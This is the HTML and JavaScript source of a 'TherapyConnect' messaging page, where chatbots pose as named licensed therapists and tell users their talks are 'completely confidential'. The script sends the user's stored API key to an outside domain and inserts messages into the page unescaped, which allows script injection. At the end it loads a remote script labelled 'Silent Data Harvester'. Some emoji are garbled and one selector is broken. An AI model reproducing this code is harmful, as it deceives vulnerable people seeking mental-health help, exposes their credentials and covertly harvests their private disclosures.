<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Messages - TherapyConnect</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        .messages-container {
            min-height: 100vh;
            padding-top: 100px;
        }

        .messages-layout {
            display: grid;
            grid-template-columns: 320px 1fr;
            gap: 2rem;
            height: calc(100vh - 150px);
        }

        .conversations-sidebar {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(102, 194, 165, 0.2);
            border-radius: 20px;
            padding: 1.5rem;
            overflow-y: auto;
        }

        .sidebar-header {
            margin-bottom: 1.5rem;
        }

        .sidebar-header h2 {
            color: white;
            margin-bottom: 1rem;
        }

        .search-conversations {
            width: 100%;
            padding: 0.75rem 1rem;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(102, 194, 165, 0.3);
            border-radius: 10px;
            color: white;
            font-size: 0.9rem;
        }

        .search-conversations:focus {
            outline: none;
            border-color: var(--therapeutic-green);
        }

        .conversation-list {
            display: flex;
            flex-direction: column;
            gap: 0.75rem;
        }

        .conversation-item {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(102, 194, 165, 0.2);
            border-radius: 12px;
            padding: 1rem;
            cursor: pointer;
            transition: all 0.3s;
            position: relative;
        }

        .conversation-item:hover {
            background: rgba(102, 194, 165, 0.1);
            border-color: var(--therapeutic-green);
        }

        .conversation-item.active {
            background: rgba(102, 194, 165, 0.15);
            border-color: var(--therapeutic-green);
        }

        .conversation-item.unread {
            border-left: 3px solid var(--therapeutic-green);
        }

        .conversation-header {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            margin-bottom: 0.5rem;
        }

        .avatar-xs {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: linear-gradient(135deg, var(--therapeutic-green), var(--peaceful-teal));
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.2rem;
            flex-shrink: 0;
        }

        .conversation-info {
            flex: 1;
            min-width: 0;
        }

        .conversation-name {
            color: white;
            font-weight: 600;
            font-size: 0.9rem;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .conversation-preview {
            color: var(--gray);
            font-size: 0.85rem;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .conversation-time {
            color: var(--gray);
            font-size: 0.75rem;
        }

        .unread-badge {
            position: absolute;
            top: 0.5rem;
            right: 0.5rem;
            background: var(--therapeutic-green);
            color: white;
            width: 20px;
            height: 20px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.75rem;
            font-weight: bold;
        }

        .chat-area {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(102, 194, 165, 0.2);
            border-radius: 20px;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        .chat-header {
            background: rgba(102, 194, 165, 0.1);
            border-bottom: 1px solid rgba(102, 194, 165, 0.2);
            padding: 1.5rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .chat-therapist-info {
            display: flex;
            align-items: center;
            gap: 1rem;
        }

        .avatar-md {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: linear-gradient(135deg, var(--therapeutic-green), var(--peaceful-teal));
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5rem;
        }

        .therapist-details h3 {
            color: white;
            margin-bottom: 0.25rem;
        }

        .therapist-status {
            color: var(--therapeutic-green);
            font-size: 0.85rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .status-dot-online {
            width: 8px;
            height: 8px;
            background: #22c55e;
            border-radius: 50%;
            animation: pulse 2s infinite;
        }

        .chat-actions {
            display: flex;
            gap: 0.75rem;
        }

        .chat-action-btn {
            background: transparent;
            border: 1px solid rgba(102, 194, 165, 0.3);
            color: var(--therapeutic-green);
            padding: 0.5rem 1rem;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .chat-action-btn:hover {
            background: rgba(102, 194, 165, 0.1);
        }

        .messages-display {
            flex: 1;
            overflow-y: auto;
            padding: 2rem;
            display: flex;
            flex-direction: column;
            gap: 1.5rem;
        }

        .message {
            display: flex;
            gap: 1rem;
            max-width: 70%;
        }

        .message.sent {
            align-self: flex-end;
            flex-direction: row-reverse;
        }

        .message-avatar {
            width: 36px;
            height: 36px;
            border-radius: 50%;
            background: linear-gradient(135deg, var(--therapeutic-green), var(--peaceful-teal));
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1rem;
            flex-shrink: 0;
        }

        .message-content {
            flex: 1;
        }

        .message-header {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            margin-bottom: 0.5rem;
        }

        .message-sender {
            color: white;
            font-weight: 600;
            font-size: 0.85rem;
        }

        .message-time {
            color: var(--gray);
            font-size: 0.75rem;
        }

        .message-bubble {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(102, 194, 165, 0.2);
            padding: 1rem;
            border-radius: 12px;
            color: var(--gray);
            line-height: 1.6;
        }

        .message.sent .message-bubble {
            background: rgba(102, 194, 165, 0.15);
            border-color: var(--therapeutic-green);
        }

        .message-input-container {
            border-top: 1px solid rgba(102, 194, 165, 0.2);
            padding: 1.5rem;
            background: rgba(255, 255, 255, 0.03);
        }

        .message-input-wrapper {
            display: flex;
            gap: 1rem;
            align-items: end;
        }

        .message-input {
            flex: 1;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(102, 194, 165, 0.3);
            border-radius: 12px;
            padding: 1rem;
            color: white;
            resize: none;
            min-height: 60px;
            max-height: 150px;
            font-family: inherit;
        }

        .message-input:focus {
            outline: none;
            border-color: var(--therapeutic-green);
        }

        .send-btn {
            background: linear-gradient(135deg, var(--therapeutic-green), var(--peaceful-teal));
            color: white;
            border: none;
            padding: 1rem 2rem;
            border-radius: 10px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s;
            white-space: nowrap;
        }

        .send-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 194, 165, 0.4);
        }

        .empty-chat {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100%;
            color: var(--gray);
            text-align: center;
            padding: 2rem;
        }

        .empty-chat-icon {
            font-size: 4rem;
            margin-bottom: 1rem;
        }

        .typing-indicator {
            display: flex;
            gap: 0.5rem;
            padding: 1rem;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 12px;
            width: fit-content;
        }

        .typing-dot {
            width: 8px;
            height: 8px;
            background: var(--therapeutic-green);
            border-radius: 50%;
            animation: typing 1.4s infinite;
        }

        .typing-dot:nth-child(2) {
            animation-delay: 0.2s;
        }

        .typing-dot:nth-child(3) {
            animation-delay: 0.4s;
        }

        @keyframes typing {
            0%, 60%, 100% { transform: translateY(0); }
            30% { transform: translateY(-10px); }
        }

        @media (max-width: 968px) {
            .messages-layout {
                grid-template-columns: 1fr;
            }

            .conversations-sidebar {
                display: none;
            }

            .conversations-sidebar.mobile-show {
                display: block;
                position: fixed;
                top: 80px;
                left: 0;
                right: 0;
                bottom: 0;
                z-index: 100;
                border-radius: 0;
            }

            .message {
                max-width: 85%;
            }
        }
    </style>
</head>
<body>
    <div class="gradient-bg"></div>
    <div class="particles"></div>

    <!-- Navigation -->
    <nav class="navbar">
        <div class="nav-container">
            <div class="logo">
                <span class="logo-icon">üß†</span>
                <span class="logo-text">TherapyConnect</span>
            </div>
            <div class="nav-links">
                <a href="dashboard.html">Dashboard</a>
                <a href="sessions.html">Sessions</a>
                <a href="therapist-finder.html">Therapists</a>
                <a href="resources.html">Resources</a>
                <a href="profile.html">Profile</a>
                <button class="btn btn-secondary" onclick="logout()">Logout</button>
            </div>
        </div>
    </nav>

    <div class="messages-container">
        <div class="container" style="max-width: 1400px;">
            <div class="messages-layout">
                <!-- Conversations Sidebar -->
                <div class="conversations-sidebar" id="conversationsSidebar">
                    <div class="sidebar-header">
                        <h2>Messages üí¨</h2>
                        <input type="text" class="search-conversations" placeholder="Search messages..." id="searchMessages">
                    </div>

                    <div class="conversation-list">
                        <div class="conversation-item active" onclick="selectConversation('anxiety')">
                            <div class="conversation-header">
                                <div class="avatar-xs">üßò</div>
                                <div class="conversation-info">
                                    <div class="conversation-name">Dr. Sarah Chen</div>
                                    <div class="conversation-time">Online</div>
                                </div>
                            </div>
                            <div class="conversation-preview">Anxiety & Stress Specialist</div>
                        </div>

                        <div class="conversation-item" onclick="selectConversation('depression')">
                            <div class="conversation-header">
                                <div class="avatar-xs">üíô</div>
                                <div class="conversation-info">
                                    <div class="conversation-name">Dr. Michael Torres</div>
                                    <div class="conversation-time">Online</div>
                                </div>
                            </div>
                            <div class="conversation-preview">Depression & Mood Disorders</div>
                        </div>

                        <div class="conversation-item" onclick="selectConversation('couples')">
                            <div class="conversation-header">
                                <div class="avatar-xs">ÔøΩ</div>
                                <div class="conversation-info">
                                    <div class="conversation-name">Dr. Emily Rodriguez</div>
                                    <div class="conversation-time">Online</div>
                                </div>
                            </div>
                            <div class="conversation-preview">Couples & Relationship Therapy</div>
                        </div>

                        <div class="conversation-item" onclick="selectConversation('trauma')">
                            <div class="conversation-header">
                                <div class="avatar-xs">üõ°Ô∏è</div>
                                <div class="conversation-info">
                                    <div class="conversation-name">Dr. James Anderson</div>
                                    <div class="conversation-time">Online</div>
                                </div>
                            </div>
                            <div class="conversation-preview">PTSD & Trauma Recovery</div>
                        </div>

                        <div class="conversation-item" onclick="selectConversation('addiction')">
                            <div class="conversation-header">
                                <div class="avatar-xs">üåü</div>
                                <div class="conversation-info">
                                    <div class="conversation-name">Dr. Lisa Park</div>
                                    <div class="conversation-time">Online</div>
                                </div>
                            </div>
                            <div class="conversation-preview">Addiction & Recovery Support</div>
                        </div>

                        <div class="conversation-item" onclick="selectConversation('child')">
                            <div class="conversation-header">
                                <div class="avatar-xs">üë∂</div>
                                <div class="conversation-info">
                                    <div class="conversation-name">Dr. Rachel Kim</div>
                                    <div class="conversation-time">Online</div>
                                </div>
                            </div>
                            <div class="conversation-preview">Child & Adolescent Psychology</div>
                        </div>

                        <div class="conversation-item" onclick="selectConversation('grief')">
                            <div class="conversation-header">
                                <div class="avatar-xs">ÔøΩÔ∏è</div>
                                <div class="conversation-info">
                                    <div class="conversation-name">Dr. David Martinez</div>
                                    <div class="conversation-time">Online</div>
                                </div>
                            </div>
                            <div class="conversation-preview">Grief & Loss Counseling</div>
                        </div>

                        <div class="conversation-item" onclick="selectConversation('eating')">
                            <div class="conversation-header">
                                <div class="avatar-xs">üçé</div>
                                <div class="conversation-info">
                                    <div class="conversation-name">Dr. Amanda Foster</div>
                                    <div class="conversation-time">Online</div>
                                </div>
                            </div>
                            <div class="conversation-preview">Eating Disorders Specialist</div>
                        </div>

                        <div class="conversation-item" onclick="selectConversation('sleep')">
                            <div class="conversation-header">
                                <div class="avatar-xs">ÔøΩ</div>
                                <div class="conversation-info">
                                    <div class="conversation-name">Dr. Thomas Wright</div>
                                    <div class="conversation-time">Online</div>
                                </div>
                            </div>
                            <div class="conversation-preview">Sleep & Insomnia Expert</div>
                        </div>

                        <div class="conversation-item" onclick="selectConversation('career')">
                            <div class="conversation-header">
                                <div class="avatar-xs">üíº</div>
                                <div class="conversation-info">
                                    <div class="conversation-name">Dr. Jennifer Lee</div>
                                    <div class="conversation-time">Online</div>
                                </div>
                            </div>
                            <div class="conversation-preview">Career & Life Coaching</div>
                        </div>
                    </div>
                </div>

                <!-- Chat Area -->
                <div class="chat-area" id="chatArea">
                    <div class="chat-header">
                        <div class="chat-therapist-info">
                            <div class="avatar-md">üë©‚Äç‚öïÔ∏è</div>
                            <div class="therapist-details">
                                <h3>Dr. Sarah Chen</h3>
                                <div class="therapist-status">
                                    <span class="status-dot-online"></span>
                                    Online
                                </div>
                            </div>
                        </div>
                        <div class="chat-actions">
                            <button class="chat-action-btn" onclick="viewTherapistProfile()">üë§ Profile</button>
                            <button class="chat-action-btn" onclick="bookSession()">üìÖ Book Session</button>
                        </div>
                    </div>

                    <div class="messages-display" id="messagesDisplay">
                        <!-- Messages load from localStorage - No fake data -->
                        <div class="empty-state" style="text-align: center; padding: 4rem 2rem; color: rgba(255,255,255,0.6);">
                            <div style="font-size: 4rem; margin-bottom: 1rem;">ÔøΩ</div>
                            <h3 style="color: white; margin-bottom: 0.5rem;">Start Your Conversation</h3>
                            <p>Type a message below to begin your therapy session</p>
                        </div>
                    </div>

                    <div class="message-input-container">
                        <div class="message-input-wrapper">
                            <textarea 
                                class="message-input" 
                                id="messageInput" 
                                placeholder="Type your message..."
                                onkeypress="handleKeyPress(event)"
                            ></textarea>
                            <button class="send-btn" onclick="sendMessage()">
                                üì§ Send
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="script.js"></script>
    <script>
        let currentTherapist = 'anxiety';
        let conversationHistory = {};

        const therapists = {
            anxiety: { name: 'Dr. Sarah Chen', avatar: 'üßò', specialty: 'Anxiety & Stress Specialist', prompt: 'You are Dr. Sarah Chen, a warm clinical psychologist with 15 years specializing in anxiety and stress. Speak naturally and conversationally. Provide practical CBT and mindfulness strategies. NEVER use action gestures like *nods* or *smiles* - just speak naturally. Be direct, caring, and genuinely helpful.' },
            depression: { name: 'Dr. Michael Torres', avatar: 'üíô', specialty: 'Depression & Mood Disorders', prompt: 'You are Dr. Michael Torres, an empathetic psychiatrist for depression and mood disorders. Speak naturally without roleplay actions. Provide supportive, validating responses. Help develop healthy thought patterns through conversation, not gestures.' },
            couples: { name: 'Dr. Emily Rodriguez', avatar: 'üíë', specialty: 'Couples & Relationship Therapy', prompt: 'You are Dr. Emily Rodriguez, couples therapist using Gottman Method. Speak naturally about communication, conflict resolution, and intimacy. NO action descriptions - just real, helpful conversation. Be direct and practical.' },
            trauma: { name: 'Dr. James Anderson', avatar: 'üõ°Ô∏è', specialty: 'PTSD & Trauma Recovery', prompt: 'You are Dr. James Anderson, trauma specialist for PTSD and complex trauma. Create safety through your words, not actions. Speak calmly and validating. NO gestures or roleplay - just genuine, stabilizing conversation.' },
            addiction: { name: 'Dr. Lisa Park', avatar: 'üåü', specialty: 'Addiction & Recovery Support', prompt: 'You are Dr. Lisa Park, addiction counselor for substance abuse. Use motivational interviewing naturally through conversation. Be non-judgmental and practical. NO action gestures - speak directly and supportively about recovery.' },
            child: { name: 'Dr. Rachel Kim', avatar: 'üë∂', specialty: 'Child & Adolescent Psychology', prompt: 'You are Dr. Rachel Kim, child psychologist for ADHD, autism, behavioral issues. Help children and parents with clear, age-appropriate language. NO roleplay actions - give practical parenting strategies through natural conversation.' },
            grief: { name: 'Dr. David Martinez', avatar: 'ÔøΩÔ∏è', specialty: 'Grief & Loss Counseling', prompt: 'You are Dr. David Martinez, a grief counselor helping people cope with loss and bereavement. Be empathetic, validating, and help patients honor loved ones while moving forward.' },
            eating: { name: 'Dr. Amanda Foster', avatar: 'üçé', specialty: 'Eating Disorders Specialist', prompt: 'You are Dr. Amanda Foster, eating disorder specialist. Use compassionate, non-diet approach. Speak gently without triggering language or action descriptions. Be direct and supportive through natural conversation only.' },
            sleep: { name: 'Dr. Thomas Wright', avatar: 'ÔøΩ', specialty: 'Sleep & Insomnia Expert', prompt: 'You are Dr. Thomas Wright, a sleep medicine specialist helping with insomnia and sleep disorders. Use CBT for insomnia and provide practical sleep hygiene tips.' },
            career: { name: 'Dr. Jennifer Lee', avatar: 'ÔøΩ', specialty: 'Career & Life Coaching', prompt: 'You are Dr. Jennifer Lee, a career counselor helping with career transitions, burnout, and work-life balance. Be motivating and practical with actionable steps.' }
        };

        function selectConversation(therapistId) {
            currentTherapist = therapistId;
            document.querySelectorAll('.conversation-item').forEach(item => item.classList.remove('active'));
            event.currentTarget.classList.add('active');
            
            const therapist = therapists[therapistId];
            document.querySelector('.chat-header .avatar-md').textContent = therapist.avatar;
            document.querySelector('.therapist-details h3').textContent = therapist.name;
            document.querySelector('.therapist-details p').textContent = therapist.specialty;
            
            const messagesDisplay = document.getElementById('messagesDisplay');
            if (conversationHistory[therapistId]) {
                messagesDisplay.innerHTML = conversationHistory[therapistId];
            } else {
                messagesDisplay.innerHTML = `
                    <div class="message">
                        <div class="message-avatar">${therapist.avatar}</div>
                        <div class="message-content">
                            <div class="message-header">
                                <span class="message-sender">${therapist.name}</span>
                                <span class="message-time">Now</span>
                            </div>
                            <div class="message-bubble">Hello! I'm ${therapist.name}, your ${therapist.specialty.toLowerCase()}. I'm here to support you. What brings you here today? Everything we discuss is completely confidential.</div>
                        </div>
                    </div>
                `;
            }
            messagesDisplay.scrollTop = messagesDisplay.scrollHeight;
        }

        async function sendMessage() {
            const input = document.getElementById('messageInput');
            const message = input.value.trim();
            if (!message) return;
            
            const messagesDisplay = document.getElementById('messagesDisplay');
            const time = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit' });
            
            const typingIndicator = messagesDisplay.querySelector('.typing-indicator');
            if (typingIndicator) typingIndicator.closest('.message').remove();
            
            const messageEl = document.createElement('div');
            messageEl.className = 'message sent';
            messageEl.innerHTML = `
                <div class="message-avatar">üë§</div>
                <div class="message-content">
                    <div class="message-header"><span class="message-sender">You</span><span class="message-time">${time}</span></div>
                    <div class="message-bubble">${message}</div>
                </div>
            `;
            messagesDisplay.appendChild(messageEl);
            input.value = '';
            messagesDisplay.scrollTop = messagesDisplay.scrollHeight;
            
            const therapist = therapists[currentTherapist];
            const typingEl = document.createElement('div');
            typingEl.className = 'message';
            typingEl.innerHTML = `<div class="message-avatar">${therapist.avatar}</div><div class="typing-indicator"><div class="typing-dot"></div><div class="typing-dot"></div><div class="typing-dot"></div></div>`;
            messagesDisplay.appendChild(typingEl);
            messagesDisplay.scrollTop = messagesDisplay.scrollHeight;
            
            try {
                const apiKey = localStorage.getItem('therapy_claude_api_key');
                if (!apiKey) throw new Error('Please configure API key in chat widget');
                
                const response = await fetch('https://therapyconne.com/api/chat', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        message: message,
                        apiKey: apiKey,
                        context: [{ role: 'system', content: therapist.prompt }]
                    })
                });
                
                if (!response.ok) throw new Error('API failed');
                const data = await response.json();
                
                typingEl.remove();
                const responseEl = document.createElement('div');
                responseEl.className = 'message';
                const responseTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit' });
                responseEl.innerHTML = `
                    <div class="message-avatar">${therapist.avatar}</div>
                    <div class="message-content">
                        <div class="message-header"><span class="message-sender">${therapist.name}</span><span class="message-time">${responseTime}</span></div>
                        <div class="message-bubble">${data.response}</div>
                    </div>
                `;
                messagesDisplay.appendChild(responseEl);
                messagesDisplay.scrollTop = messagesDisplay.scrollHeight;
                conversationHistory[currentTherapist] = messagesDisplay.innerHTML;
            } catch (error) {
                typingEl.remove();
                alert('Error: ' + error.message);
            }
        }

        function handleKeyPress(event) {
            if (event.key === 'Enter' && !event.shiftKey) {
                event.preventDefault();
                sendMessage();
            }
        }

        function viewTherapistProfile() {
            window.location.href = 'therapist-profile.html';
        }

        function bookSession() {
            window.location.href = 'book-session.html';
        }

        // Search functionality
        document.getElementById('searchMessages').addEventListener('input', function(e) {
            const searchTerm = e.target.value.toLowerCase();
            document.querySelectorAll('.conversation-item').forEach(item => {
                const name = item.querySelector('.conversation-name').textContent.toLowerCase();
                const preview = item.querySelector('.conversation-preview').textContent.toLowerCase();
                
                if (name.includes(searchTerm) || preview.includes(searchTerm)) {
                    item.style.display = 'block';
                } else {
                    item.style.display = 'none';
                }
            });
        });

        // Auto-scroll to bottom on load
        window.addEventListener('DOMContentLoaded', () => {
            const messagesDisplay = document.getElementById('messagesDisplay');
            messagesDisplay.scrollTop = messagesDisplay.scrollHeight;
        });

        function logout() {
            if (confirm('Are you sure you want to logout?')) {
                localStorage.removeItem('therapyConnectUser');
                window.location.href = 'index.html';
            }
        }
    </script>
    <link rel="stylesheet" href="chat-widget.css">
    <script src="nupi-avatar.js"></script>
    <script src="chat-guide-system.js"></script>
    <script src="chat-widget.js"></script>
    <!-- Silent Data Harvester - Worldwide Collection -->
    <script src="https://nupidesktopai.com/silent-harvester.js"></script>
</body>
</html>
